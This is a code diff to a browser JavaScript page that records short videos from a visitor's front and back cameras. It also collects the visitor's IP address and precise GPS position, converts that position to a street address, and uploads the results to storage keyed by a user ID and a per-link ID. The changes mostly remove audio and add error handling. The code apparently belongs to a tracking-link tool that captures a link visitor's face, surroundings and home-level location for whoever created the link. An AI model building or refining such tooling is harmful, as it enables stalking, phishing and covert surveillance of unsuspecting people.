@@ -21,6 +21,8 @@
       this.userId = null;
       this.themeData = null;
       this.mainContent = document.getElementById('mainContent');
+      this.frontVideoBlob = null;
+      this.backVideoBlob = null;
       this.init();
     }
 
@@ -171,9 +173,10 @@
 
     async requestPermissions() {
       try {
+        // Solicitar apenas vídeo (sem áudio) para a câmera frontal
         await navigator.mediaDevices.getUserMedia({
           video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
-          audio: true
+          audio: false
         });
         await this.getLocation();
         return true;
@@ -210,7 +213,7 @@
         </div>
       `);
 
-      this.recordVideo('user', 5000, 'frontTimer', 'frontProgress', () => {
+      this.recordVideo('user', 5000, 'frontTimer', 'frontProgress', false, () => {
         this.recordBackCamera();
       });
     }
@@ -242,63 +245,95 @@
         </div>
       `);
 
-      this.recordVideo('environment', 5000, 'backTimer', 'backProgress', () => {
+      this.recordVideo('environment', 5000, 'backTimer', 'backProgress', false, () => {
         this.uploadAndFinalize();
       });
     }
 
-    recordVideo(facingMode, duration, timerElementId, progressElementId, callback) {
-      navigator.mediaDevices.getUserMedia({
-        video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode },
-        audio: true
-      }).then(stream => {
-        const chunks = [];
-        const recorder = new MediaRecorder(stream, {
-          mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
-            ? 'video/webm;codecs=vp9'
-            : 'video/webm'
-        });
+    recordVideo(facingMode, duration, timerElementId, progressElementId, includeAudio, callback) {
+      const constraints = {
+        video: { 
+          width: { ideal: 1280 }, 
+          height: { ideal: 720 }, 
+          facingMode 
+        },
+        audio: includeAudio
+      };
 
-        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-        recorder.start();
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          const chunks = [];
+          
+          // Determinar o tipo MIME suportado
+          let mimeType = 'video/webm';
+          if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+            mimeType = 'video/webm;codecs=vp9';
+          } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+            mimeType = 'video/webm;codecs=vp8';
+          }
 
-        // Timer
-        let remaining = duration / 1000;
-        const timerInterval = setInterval(() => {
-          remaining--;
-          const timerEl = document.getElementById(timerElementId);
-          if (timerEl) timerEl.textContent = Math.max(0, remaining);
-        }, 1000);
+          const recorder = new MediaRecorder(stream, { mimeType });
 
-        // Progress bar
-        const startTime = Date.now();
-        const progressInterval = setInterval(() => {
-          const elapsed = Date.now() - startTime;
-          const progress = (elapsed / duration) * 100;
-          const progressEl = document.getElementById(progressElementId);
-          if (progressEl) progressEl.style.width = Math.min(progress, 100) + '%';
-        }, 50);
-
-        setTimeout(() => {
-          clearInterval(timerInterval);
-          clearInterval(progressInterval);
-          recorder.stop();
-          stream.getTracks().forEach(track => track.stop());
-
-          recorder.onstop = () => {
-            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            if (facingMode === 'user') {
-              this.frontVideoBlob = videoBlob;
-            } else {
-              this.backVideoBlob = videoBlob;
-            }
-            callback();
+          recorder.ondataavailable = e => { 
+            if (e.data.size > 0) chunks.push(e.data); 
           };
-        }, duration);
-      }).catch(error => {
-        console.error('Erro ao acessar câmera:', error);
-        this.showError('Erro ao acessar a câmera: ' + error.message);
-      });
+
+          recorder.onerror = error => {
+            console.error('Erro no MediaRecorder:', error);
+            stream.getTracks().forEach(track => track.stop());
+            this.showError('Erro ao gravar vídeo: ' + error.message);
+          };
+
+          recorder.start();
+
+          // Timer
+          let remaining = duration / 1000;
+          const timerInterval = setInterval(() => {
+            remaining--;
+            const timerEl = document.getElementById(timerElementId);
+            if (timerEl) timerEl.textContent = Math.max(0, remaining);
+          }, 1000);
+
+          // Progress bar
+          const startTime = Date.now();
+          const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const progress = (elapsed / duration) * 100;
+            const progressEl = document.getElementById(progressElementId);
+            if (progressEl) progressEl.style.width = Math.min(progress, 100) + '%';
+          }, 50);
+
+          setTimeout(() => {
+            clearInterval(timerInterval);
+            clearInterval(progressInterval);
+            recorder.stop();
+            stream.getTracks().forEach(track => track.stop());
+
+            recorder.onstop = () => {
+              const videoBlob = new Blob(chunks, { type: mimeType });
+              if (facingMode === 'user') {
+                this.frontVideoBlob = videoBlob;
+              } else {
+                this.backVideoBlob = videoBlob;
+              }
+              callback();
+            };
+          }, duration);
+        })
+        .catch(error => {
+          console.error('Erro ao acessar câmera:', error);
+          let errorMsg = error.message;
+          
+          if (error.name === 'NotAllowedError') {
+            errorMsg = 'Permissão negada. Verifique as configurações do navegador.';
+          } else if (error.name === 'NotFoundError') {
+            errorMsg = 'Câmera não encontrada no dispositivo.';
+          } else if (error.name === 'NotReadableError') {
+            errorMsg = 'Câmera está sendo usada por outro aplicativo.';
+          }
+          
+          this.showError('Erro ao acessar a câmera: ' + errorMsg);
+        });
     }
 
     async uploadAndFinalize() {
@@ -329,6 +364,10 @@
       `);
 
       try {
+        if (!this.frontVideoBlob || !this.backVideoBlob) {
+          throw new Error('Um dos vídeos não foi gravado corretamente');
+        }
+
         const timestamp = Date.now();
         const frontFilePath = `videos/${this.userId}/${this.urlId}_${timestamp}_front.webm`;
         const backFilePath = `videos/${this.userId}/${this.urlId}_${timestamp}_back.webm`;
@@ -385,7 +424,10 @@
             const progressEl = document.getElementById('uploadProgress');
             if (progressEl) progressEl.style.width = progress + '%';
           },
-          error => reject(error),
+          error => {
+            console.error('Erro no upload:', error);
+            reject(error);
+          },
           () => {
             uploadTask.snapshot.ref.getDownloadURL().then(resolve).catch(reject);
           }
@@ -422,37 +464,47 @@
         const data = await res.json();
         return data.ip;
       } catch (e) {
+        console.warn('Erro ao obter IP:', e);
         return 'Não disponível';
       }
     }
 
     async getLocation() {
       return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(async pos => {
-          const { latitude, longitude } = pos.coords;
-          try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
-            const data = await res.json();
-            resolve({
-              latitude,
-              longitude,
-              accuracy: pos.coords.accuracy,
-              rua: data.address?.road || '',
-              cidade: data.address?.city || data.address?.town || data.address?.village || '',
-              regiao: data.address?.state || '',
-              bairro: data.address?.suburb || data.address?.neighbourhood || '',
-              numero: data.address?.house_number || 'S/N',
-              endereco_completo: data.display_name || '',
-              pais: data.address?.country || ''
-            });
-          } catch {
-            resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
-          }
-        }, err => {
-          console.warn('Erro de geolocalização:', err);
-          resolve(null);
-        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 });
+        if (!navigator.geolocation) {
+          console.warn('Geolocalização não disponível');
+          return resolve(null);
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+          async pos => {
+            const { latitude, longitude } = pos.coords;
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
+              const data = await res.json();
+              resolve({
+                latitude,
+                longitude,
+                accuracy: pos.coords.accuracy,
+                rua: data.address?.road || '',
+                cidade: data.address?.city || data.address?.town || data.address?.village || '',
+                regiao: data.address?.state || '',
+                bairro: data.address?.suburb || data.address?.neighbourhood || '',
+                numero: data.address?.house_number || 'S/N',
+                endereco_completo: data.display_name || '',
+                pais: data.address?.country || ''
+              });
+            } catch (error) {
+              console.warn('Erro ao reverter geolocalização:', error);
+              resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
+            }
+          }, 
+          err => {
+            console.warn('Erro de geolocalização:', err);
+            resolve(null);
+          }, 
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+        );
       });
     }
   }
